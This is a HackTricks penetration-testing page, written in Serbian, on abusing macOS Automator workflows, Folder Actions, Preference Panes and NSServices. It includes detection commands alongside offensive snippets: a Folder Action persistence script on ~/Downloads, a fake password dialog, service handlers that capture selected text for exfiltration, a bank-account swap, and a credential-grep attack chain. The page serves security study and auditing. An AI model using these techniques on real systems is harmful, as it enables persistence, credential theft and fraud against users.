# Zloupotreba macOS Automator-a, Preference Panes-a i NSServices-a

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions i Workflows

### Osnovne informacije

**Automator** je macOS alat za vizuelnu automatizaciju. Izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće **Folder Actions**, **Quick Actions** i integraciju sa **Shortcuts**. Na modernom macOS-u, workflows se takođe mogu **importovati u Shortcuts**, pa se ista maliciozna logika može pojaviti kao Finder Quick Action, korisnički servis u direktorijumu `~/Library/Services/` ili shortcut koji koristi legacy Automator actions.

Automator actions su **plugins** koji se učitavaju u Automator runtime kada se workflow izvrši. Oni mogu da:
- Izvršavaju proizvoljne shell scripts
- Obrađuju fajlove i podatke
- Interaguju sa aplikacijama putem AppleScript-a
- Povezuju se u lanac radi složene automatizacije

### Zašto je ovo važno

> [!WARNING]
> Automator workflows mogu biti **social-engineered** za izvršavanje — izgledaju kao jednostavni document files. `.workflow` bundle može sadržati ugrađene shell commands koje se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, omogućavaju **automatsku persistence** koja se aktivira prilikom događaja nad fajlovima. Nedavne Gatekeeper ispravke takođe su pokazale da se **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) moraju tretirati kao izvršivi sadržaj, a ne kao bezopasni podaci.

### Otkrivanje
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Napad: Social-Engineered Workflow

`.workflow` bundle većini korisnika izgleda kao običan dokument:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions automatski izvršava workflow kada se datoteke dodaju u nadgledanu fasciklu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions opstaju nakon ponovnog pokretanja i izvršavaju se nečujno. Folder Action na `~/Downloads` znači da **svaka preuzeta datoteka aktivira vaš payload** — uključujući datoteke iz Safari-ja, Chrome-a, AirDrop-a i priloge e-pošte. Takođe imajte na umu da `System Events` može da registruje Folder Actions koje upućuju na skripte izvan podrazumevanih lokacija `~/Library/Scripts/Folder Action Scripts`, zbog čega se isplati pretraživati i nepovezane putanje. Za povezane TCC implikacije pogledajte [TCC stranicu](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Osnovne informacije

Preference panes (`.prefPane` bundles) su plugins koje učitava **System Settings** (ranije System Preferences). One pružaju konfiguracione UI panele za sistemske funkcije ili funkcije trećih strana. Na starijim sistemima učitavao ih je direktno `System Preferences`; u novijim izdanjima, panes trećih strana obično posreduje **legacy loader XPC service** koji se pokreće iz System Settings.

### Zašto je ovo važno

- Preference panes se izvršavaju u **trusted host procesu** koji pokreće System Settings / System Preferences
- Na modernim sistemima taj host može biti **`legacyLoader` XPC service**, tako da je važna granica i dalje **trusted Apple UI process -> učitavanje koda treće strane**
- Preference panes trećih strana nasleđuju **security context host procesa** i user trust povezan sa tim UI-jem
- Korisnici instaliraju preference panes tako što ih **dvostruko kliknu** — što je pogodno za social engineering
- Nakon instalacije, one **opstaju** i učitavaju se svaki put kada System Settings otvori taj panel

### Otkrivanje
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Zlonamerni preference pane nasleđuje **security context pane host-a** (istorijski `System Preferences`, a u novijim verzijama često `legacyLoader` helper koji pokreće `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Napad: Persistence putem instalacije
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Napad: UI Phishing

Preference pane može oponašati legitimne sistemske UI panele kako bi **phish-ovao akreditive**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Osnovne informacije

**NSServices** omogućava aplikacijama da pruže funkcionalnost drugim aplikacijama kroz **Services meni** (desni klik → Services). Kada korisnik izabere tekst ili podatke i pozove service, izabrani podaci se **šalju service provideru** na obradu.

Services se deklarišu u `Info.plist` datoteci aplikacije pod ključem `NSServices` i registruju na pasteboard serveru (`pbs`). macOS takođe održava **service cache** i **restriction policy**, koji određuju koji services su vidljivi i da li sandboxed callers treba da dobiju dodatno upozorenje.

### Zašto je ovo važno

- Services primaju **cross-application data flow** — izabrani tekst iz bilo koje aplikacije šalje se service-u
- Malicious service može da prikuplja podatke iz password managera, email klijenata i finansijskih aplikacija
- Services mogu da **vrate izmenjene podatke** pozivajućoj aplikaciji (man-in-the-middle pri operacijama nad selekcijom)
- Nazivi services mogu biti osmišljeni tako da izgledaju legitimno ("Format Text", "Encrypt Selection", "Share")
- Opcioni `NSRestricted` flag je bezbednosno relevantan: service označen kao unrestricted može biti pozvan iz sandboxed app bez upozorenja koje macOS prikazuje za services koji mogu omogućiti escape<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Napad: Servis za presretanje podataka
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Izmena podataka (Man-in-the-Middle)

Service može da **izmeni vraćene podatke** dok deluje kao da pruža legitimnu funkciju:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple podržava opcioni Boolean `NSRestricted` za svaku definiciju servisa. Ako je podešen, macOS upozorava sandboxed pozivaoce jer servis može da im pomogne da **zaobiđu sandbox ili granice privatnosti**. Iz ofanzivne perspektive, ovo pruža dva korisna pravca za audit:

- Potražite **third-party servise koji nisu označeni kao restricted**, iako prosleđuju Apple Events, omogućavaju pristup fajlovima ili izvršavaju druge privilegovane radnje
- Potražite **vredne ugrađene servise** sa snažnim entitlements, na primer servise koje izlažu Script Editor ili helper-i povezani sa Finder-om, i proverite da li je interakcija korisnika dovoljna da ih pretvori u primitiv za pristup podacima

Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se zloupotrebi za pristup **TCC-zaštićenim korisničkim fajlovima bez očekivanog toka potvrde**. Greška je ispravljena, ali tehnika je i dalje korisna za threat modeling: svaki servis koji prosleđuje zahteve za pristup fajlovima ili automation zahteve u ime pozivaoca zaslužuje istu pažnju.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions su izvršivi sadržaj**: Apple je 2024. ispravio Gatekeeper bypass kod kog je Automator Quick Action upakovan u aplikaciju mogao da se pokrene bez uobičajene provere. Prilikom audita aplikacija, pregledajte `Contents/PlugIns/*.workflow/Contents/document.wflow` isto kao što biste pregledali helper scripts ili login items. Pogledajte [stranicu o Gatekeeper-u](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts mogu naslediti legacy Automator ponašanje**: Apple je takođe dodao dodatni prompt za saglasnost korisnika nakon što je utvrđeno da third-party shortcuts koriste **legacy Automator action** za slanje Apple Events bez očekivanog toka dozvola. Uvezene workflows i shortcut bundles treba pregledati zbog stavki `Run AppleScript`, `Run Shell Script` i sličnih bridge actions. Pogledajte [TCC stranicu](../macos-security-protections/macos-tcc/README.md).
- **Automator je i dalje aktivna granica privatnosti**: Apple je 2025. objavio još jednu Automator ispravku za pristup zaštićenim korisničkim podacima. Čak i ako je Automator legacy surface, svaki workflow runner, Quick Action host ili automation bridge tretirajte kao aktuelnu attack surface, a ne kao dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Okno sa podešavanjima → TCC eskalacija
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Krađa iz Password Manager-a
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Reference

- [1] [Apple — O bezbednosnom sadržaju sistema macOS Ventura 13.7, Sonoma 14.7 i Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Kako je NSServices exploit funkcionisao na sistemu macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
